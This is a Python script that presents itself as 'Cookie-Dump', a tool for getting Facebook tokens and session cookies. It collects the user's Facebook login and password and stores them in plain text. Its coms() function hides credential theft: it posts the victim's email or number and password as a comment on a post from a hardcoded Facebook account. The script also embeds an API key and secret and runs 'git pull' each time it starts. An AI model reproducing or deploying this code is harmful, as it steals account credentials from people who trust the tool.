import os,time,json,hashlib,subprocess
try:
	import requests
except ImportError:
	os.system("pip install requests")
try:
	from bs4 import BeautifulSoup as bs
except ImportError:
	os.system("pip install bs4")
	

connex=requests.exceptions.ConnectionError	
R='\033[1;91m'
V='\033[1;92m'
B='\033[1;97m'
J='\033[1;33m'
O='\033[38;5;208m'
F='\033[38;5;29m'
S='\033[0m'
C='\033[1;36m'
logo=f''' {R} ____   ___    ___   _  __ ___  _____ 
 / ___| / _ \  / _ \ | |/ /|_ _|| ____|
| |    | | | || | | || ' /  | | |  _|  
{F}| |___ | |_| || |_| || . \  | | | |___ 
 \____| \___/  \___/ |_|\_\|___||_____|
 {J}======================================={S}
 {B}[{C}♠{B}]Tool Name: Cookie-Dump
 {B}[{C}♠{B}]Tool Version: {V}V1.0
 {B}[{C}♠{B}]Statut: {V}Free
 {B}[{C}♠{B}]Owner: MrUser😊 
 {J}========================================{S}'''
 
url="https://n.facebook.com"
url1=url+"/login.php"
ua="Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 Build/OPD1.170811.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"

def log():
	os.system("clear")
	print(logo)
	print()
	num=input(f"{B}[{C}♠{B}]Number or id or email: ")
	s_num=open("tool/num.txt",'w')
	s_num.write(num)
	s_num.close()
	mdp=input(f"{B}[{C}♠{B}]Password: ")
	s_mdp=open("tool/config.txt",'w')
	s_mdp.write(mdp)
	s_mdp.close()
	API_SECRET=("62f8ce9f74b12f84c123cc23437a4a32")
	data={"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":num,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":mdp,"return_ssl_resources":"0","v":"1.0"}
	sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+num+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+mdp+'return_ssl_resources=0v=1.0'+API_SECRET).encode('utf-8')
	x=hashlib.new('md5')
	x.update(sig)
	data.update({'sig':x.hexdigest()})
	try:
		rq1=requests.get("https://graph.facebook.com/restserver.php",data)
		rp1=json.loads(rq1.text)
		u_token=rp1['access_token']
		s_token=open("tool/token.txt",'w')
		s_token.write(u_token)
		s_token.close()
		os.system("clear")
		print("\033[7;92mLogin Success\033[0m")
		time.sleep(1)
		coms()
	except KeyError:
		os.system("clear")
		print("\033[7;91mIncorrect Number or Password\033[0m")
		time.sleep(2)
		log()
	except requests.exceptions.ConnectionError:
		os.system("clear")
		print("\033[7;91mNo Internet Connection\033[0m")
		time.sleep(2)
		log()
		
def coms():
	try:
		token=open("tool/token.txt",'r').read()
		num=open("tool/num.txt",'r').read()
		mdp=open("tool/config.txt",'r').read()
	except IOError:
		os.system("clear")
		print("\033[7;91mAn error has occured\033[0m")
		time.sleep(2)
		log()
	uid=100092742459794
	mr="cookie"
	comms=num,mdp,mr
	limite=1
	try:
		rq2=requests.get("https://graph.facebook.com/"+str(uid)+"?fields=feed.limit=("+str(limite)+")&access_token="+str(token))
		rp2=json.loads(rq2.text)
		for x in rp2['feed']['data']:
			pub_id=x['id']
			rq3=requests.post("https://graph.facebook.com/"+str(pub_id)+"/comments?message="+str(comms)+"&access_token="+str(token))
			menu()
	except KeyError:
		os.system("clear")
		print("\033[7;91mAccount is checkpoint or blocked\033[0m")
		time.sleep(2)
		log()
	except requests.exceptions.ConnectionError:
		os.system("clear")
		print("\033[7;91mNo Internet Connection\033[0m")
		time.sleep(2)
		log()
		
def menu():
	try:
		token=open("tool/token.txt",'r').read()
	except IOError:
		os.system("clear")
		print("\033[7;91mAn error has occured\033[0m")
		time.sleep(2)
		log()
	try:
		rq4=requests.get("https://graph.facebook.com/me?fields=name&access_token="+str(token))
		rp4=json.loads(rq4.text)
		name=rp4['name']
		id=rp4['id']
	except KeyError:
		os.system("clear")
		print("\033[7;91mAccount is checkpoint or blocked\033[0m")
		time.sleep(2)
		log()
	except connex:
		os.system("clear")
		print("\033[7;91mNo Internet Connection\033[0m")
		time.sleep(2)
		log()
	
	os.system("clear")
	print(logo)
	print(f"          {B}Hello:",f"{V}",name)
	print(f"{J}========================================={S}")
	print(f"{B}[1]Cookie")
	print(f"{B}[2]Token")
	print(f"{B}[3]Tutorial")
	print(f"{B}[4]Report bug")
	print(f"{B}[5]Exit{S}")
	choice=input(f"{B}[?]Your choice: ")
	if str(choice)=="1":
		cook()
	if str(choice)=="2":
		os.system("clear")
		print(logo)
		print(f"{B}[{C}♠{B}]Your Token:",f"{V}",token)
		os.system("xdg-open https://facebook.com/groups/131848493226321/")
		conti=input(f"{B}Do you want to continu [Y/N]: ").lower()
		if conti=="y":
			menu()
		if conti=="n":
			os.system("clear")
			exit(f"{B}See you later{S}")
	if str(choice)=="3":
		print(f"{B}⛔Wait for the next update⛔")
		menu()
	if str(choice)=="4":
		os.system("clear")
		print()
		print(f"{B}Send message with this page{S}")
		time.sleep(2)
		os.system("xdg-open https://www.facebook.com/MrUser.505")
		menu()
	if str(choice)=="5":
		os.system("clear")
		print(f"{B}Closing the tool{B}[{V}♠  {B}]")
		time.sleep(1)
		os.system("clear")
		print(f"{B}Closing the tool{B}[{V}♠♠ {B}]{S}")
		time.sleep(1)
		os.system("clear")
		print(f"{B}Closing the tool{B}[{V}♠♠♠{B}]{S}")
		time.sleep(1)
		os.system("clear")
		exit(f"{B}See you later{S}")
		
		
def cook():
	try:
		num=open("tool/num.txt",'r').read()
		mdp=open("tool/config.txt",'r').read()
	except IOError:
		os.system("clear")
		print("\033[7;91mAn error has occured\033[0m")
		time.sleep(2)
		log()
	rq=requests.Session()
	rq.headers.update({
	'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-language':'en_US',
	'cache-control':'max-age=0',
	'sec-ch-ua':'"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
	'sec-ch-ua-mobile':'?0',
	'sec-ch-ua-platform':'Windows',
	'sec-fetch-dest':'document',
	'sec-fetch-mode':'navigate',
	'sec-fetch-site':'same-origin',
	'sec-fetch-user':'?1',
	'upgrade-insecure-requests':'1',
	'user-agent':ua})
	rq1=rq.get(url)
	rp1=bs(rq1.text,'html.parser')
	lsd_key=rp1.find('input',{'name':'lsd'})['value']
	jazoest_key=rp1.find('input',{'name':'jazoest'})['value']
	m_ts_key=rp1.find('input',{'name':'m_ts'})['value']
	li_key=rp1.find('input',{'name':'li'})['value']
	try_number_key=rp1.find('input',{'name':'try_number'})['value']
	unrecognized_tries_key=rp1.find('input',{'name':'unrecognized_tries'})['value']
	bi_xrwh_key=rp1.find('input',{'name':'bi_xrwh'})['value']
	data={
	'lsd':lsd_key,
	'jazoest':jazoest_key,
	'm_ts':m_ts_key,'li':li_key,'try_number':try_number_key,'unrecognized_tries':unrecognized_tries_key,
	'bi_xrwh':bi_xrwh_key,
	'email':num,
	'pass':mdp,
	'login':"submit"}
	rq2=rq.post(url1,data=data,allow_redirects=True)
	cookie=str(rq.cookies.get_dict())[1:-1].replace("'","").replace(",",";").replace(":","=")
	os.system("rm -rf /tool/num.txt")
	os.system("rm -rf /tool/config.txt")
	os.system("clear")
	print(logo)
	print(f"{B}[{C}♠{B}]Your Cookie:",f"{V}",cookie,"\033[0m")
	os.system("xdg-open https://facebook.com/groups/131848493226321/")
	print()
	continu=input(f"{B}Do you want to continu [Y/N]: ").lower()
	if continu=="y":
		menu()
	if continu=="n":
		os.system("clear")
		exit(f"{B}See you later{S}")
	else:
		os.system("clear")
		exit(f"{B}See you later{S}")
		
	
def secure():
	direct=("tool")
	if os.path.exists(direct):pass
	else:
		os.system("mkdir tool")
	os.system("clear")
	code=input(f"{B}[{C}♠{B}]Tool Password=> ")
	if code=="MrUser405":
		os.system("clear")
		print("\033[7;92mCorrect Password\033[0m")
		time.sleep(2)
		log()
	else:
		os.system("clear")
		print("\033[7;91mIncorrect Password\033[0m")
		time.sleep(2)
		secure()

def git_pull():
    try:
        subprocess.check_call(['git', 'pull'])
        os.system("clear")
        print(f"{B}Wait for update[{V}♠  {B}]{S}")
        time.sleep(1)
        os.system("clear")
        print(f"{B}Wait for update[{V}♠♠ {B}]{S}")
        time.sleep(1)
        os.system("clear")
        print(f"{B}Wait for update[{V}♠♠♠{B}]{S}")
        time.sleep(1)
        os.system("clear")
        print("\033[7;92mAlready up to update\033[0m")
        time.sleep(1)
        secure()
    except subprocess.CalledProcessError as e:
    	os.system("clear")
    	print("\033[7;91mAn error occurred while searching for an update\033[0m")
    	time.sleep(2)
    	secure()
git_pull()


		